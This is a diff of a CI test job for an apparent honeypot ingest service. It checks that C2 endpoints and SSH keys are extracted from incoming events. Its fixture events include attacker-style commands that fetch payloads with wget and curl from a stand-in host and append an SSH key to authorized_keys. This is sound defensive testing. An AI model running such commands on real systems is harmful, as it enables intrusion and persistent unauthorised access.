@@ -585,6 +585,41 @@ jobs:
           assert "re-running it changes nothing" "true" \
             "$(grep -q '^  done. 0 rows classified' /tmp/classify2.log && echo true || echo false)"
 
+          echo "--- indicator extraction on the ingest path (migration 014) ---"
+          # A newly seen C2 address has to reach cowrie_iocs when the event
+          # arrives, not when someone remembers to run the backfill. Two
+          # commands carrying the same endpoint, because that is the case that
+          # made the first version of this raise "ON CONFLICT DO UPDATE cannot
+          # affect row a second time" on the write path.
+          curl -fsS -X POST -H 'Content-Type: application/json' \
+            -H "Authorization: Bearer $INGEST_API_KEY" \
+            -d '{"events":[
+                  {"src_ip":"203.0.113.30","session_id":"ci-i1","command":"wget http://198.51.100.9:4444/a -O /tmp/Aa1zZ9"},
+                  {"src_ip":"203.0.113.31","session_id":"ci-i2","command":"curl http://198.51.100.9:4444/b -o /tmp/Bb2yY8"},
+                  {"src_ip":"203.0.113.32","session_id":"ci-i3","command":"echo \"ssh-rsa AAAAB3NzaC1yc2ETESTKEYBODYnnnnnnnnnnnnnnnnnnnnnnnn mdrfckr\" >> .ssh/authorized_keys"}
+                ]}' "$API/api/cowrie/events" >/dev/null
+
+          assert "the c2 endpoint was extracted" "1" \
+            "$("${PSQL[@]}" -qtA -c "SELECT count(*) FROM cowrie_iocs WHERE ioc_type = 'c2_endpoint' AND value = '198.51.100.9:4444'")"
+          # Counted per distinct command, not per sighting: two commands name
+          # this endpoint, so two.
+          assert "counted once per command, not per mention" "2" \
+            "$("${PSQL[@]}" -qtA -c "SELECT occurrence_count FROM cowrie_iocs WHERE value = '198.51.100.9:4444'")"
+          assert "the port is kept as metadata" "4444" \
+            "$("${PSQL[@]}" -qtA -c "SELECT meta->>'port' FROM cowrie_iocs WHERE value = '198.51.100.9:4444'")"
+          assert "the ssh key is keyed on the body" "1" \
+            "$("${PSQL[@]}" -qtA -c "SELECT count(*) FROM cowrie_iocs WHERE ioc_type = 'ssh_key'")"
+          assert "and keeps its comment" "mdrfckr" \
+            "$("${PSQL[@]}" -qtA -c "SELECT meta->>'comment' FROM cowrie_iocs WHERE ioc_type = 'ssh_key'")"
+          # occurrence_count must equal the pair table, or the two write paths
+          # disagree about what the number means.
+          assert "occurrence_count matches the pair table" "0" \
+            "$("${PSQL[@]}" -qtA -c "SELECT count(*) FROM cowrie_iocs i LEFT JOIN (SELECT ioc_id, count(*) n FROM cowrie_ioc_commands GROUP BY 1) c ON c.ioc_id = i.id WHERE i.occurrence_count IS DISTINCT FROM COALESCE(c.n, 0)")"
+          # Private space must never be published as infrastructure: Cowrie's
+          # own log lines embed the sensor's LAN address.
+          assert "private addresses are not indicators" "0" \
+            "$("${PSQL[@]}" -qtA -c "SELECT count(*) FROM cowrie_iocs WHERE value LIKE '192.168.%' OR value LIKE '127.%' OR value LIKE '10.%'")"
+
           echo "--- client fingerprints and tunnel requests ---"
           # cowrie.client.version and cowrie.client.kex are two log lines for
           # one session, arriving in either order. Post them kex-first so the
